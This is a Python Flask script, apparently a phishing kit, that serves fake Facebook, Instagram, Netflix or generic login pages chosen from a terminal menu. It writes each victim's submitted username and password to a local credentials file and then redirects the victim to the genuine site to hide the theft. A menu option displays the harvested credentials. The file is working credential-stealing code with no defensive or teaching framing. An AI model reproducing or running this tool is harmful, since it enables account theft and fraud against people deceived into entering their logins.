from flask import Flask, render_template_string, request, redirect
from datetime import datetime
from modulos.inicio import banner, banner2, banner3
import os
from rich.console import Console
from rich.markdown import Markdown
from rich.progress import Progress
import time
from rich.panel import Panel


MARKDOWN = """
# Menú de opciones
1. FACEBOOK
2. INSTAGRAM
3. GENERICA
4. NETFLIX
5. Ver *Credenciales capturadas*
6. Salir
"""

app = Flask(__name__)
selected_option = None

class FakeLogin:
    def __init__(self):
        pass

    def get_html(self, option):
        # Determinar el contenido HTML y el nombre de la plantilla según la opción seleccionada
        if option == 1:
            with open('template/facebook/index-Facebook.html', 'r', encoding='utf-8') as file:
                contenido = file.read()
            template_name = 'Facebook'
            redirect_url = "https://www.facebook.com"
        elif option == 2:
            with open('template/instagram/index-Instagram.html', 'r') as file:
                contenido = file.read()
            template_name = 'Instragram'
            redirect_url = "https://instagram.com"             
        elif option == 3:
            with open('template/generica/index.html', 'r') as file:
                contenido = file.read()
            template_name = 'Generica'
            redirect_url = "https://wikipedia.org"
        elif option == 4:
            with open('template/netflix/index-Netflix.html', 'r') as file:
                contenido = file.read()
            template_name = 'Netflix'
            redirect_url = "https://www.netflix.com/login"    
        else:
            contenido = "<h1>Página no encontrada</h1>"
            template_name = None
            redirect_url = None
        
        return contenido, template_name, redirect_url

    def handle_login(self, username, password, template_name):
        # Guardar las credenciales y el nombre de la plantilla en un archivo
        with open("credenciales.txt", "a") as f:
            f.write('-----------------------------------------------------------------\n')
            f.write(f"User: {username}\nPass: {password}\nRed: {template_name}\n")
            now = datetime.now()
            hora = now.hour
            minu = now.minute + 1
            f.write(f'Hora: {hora}:{minu}\n')
            f.write('-----------------------------------------------------------------\n')

@app.route('/')
def index():
    # Obtener el contenido HTML y el nombre de la plantilla según la opción seleccionada
    page = FakeLogin()
    contenido, template_name, _ = page.get_html(selected_option)
    return render_template_string(contenido)

@app.route('/fake_login', methods=['POST'])
def fake_login():
    username = request.form['username']
    password = request.form['password']
    
    # Manejar el inicio de sesión y guardar las credenciales
    page = FakeLogin()
    _, template_name, redirect_url = page.get_html(selected_option)  # Obtener el nombre de la plantilla y URL
    page.handle_login(username, password, template_name)  # Guardar las credenciales
    
    return redirect(redirect_url)  # Redirigir a la URL correspondiente

def view_credentiales():
    print('\nCredenciales')
    with open ('credenciales.txt','r') as file:
        credenciales = file.read()
    
    print(f'{credenciales}')
    
def seleccionar_opcion():
    global selected_option
    banner3()

    console = Console()
    md = Markdown(MARKDOWN)
    menu_panel = Panel(md, style="bold green",title="version 1.0.0", border_style="blue")
    console.print(menu_panel)


    while True:
        try:
            option = int(input("Seleccione una opción: "))
            if option in [1, 2, 3, 4]:
                selected_option = option
                break
            if option == 5:
                try:
                    view_credentiales()
                except Exception as e:
                    print('Error en la lectura del archivo o está vacío')
            if option == 6:
                print('Saliendo del programa...')
                exit()
            else:
                print("Opción no válida. Intente nuevamente.")
        except ValueError:
            print("Entrada no válida. Por favor, ingrese un número.")

if __name__ == '__main__':
    while(True):        
        seleccionar_opcion()
        os.system('clear' if os.name == 'posix' else 'cls')
        banner()
        print("Iniciando el servidor Flask...")
        with Progress() as progress:
            task = progress.add_task("[green]Procesando...", total=5)
            while not progress.finished:
                progress.update(task, advance=0.2)
                time.sleep(0.1)
        print("Accede al servidor en http://127.0.0.1:5000")
        app.run(host='127.0.0.1', port=5000, debug=False) 
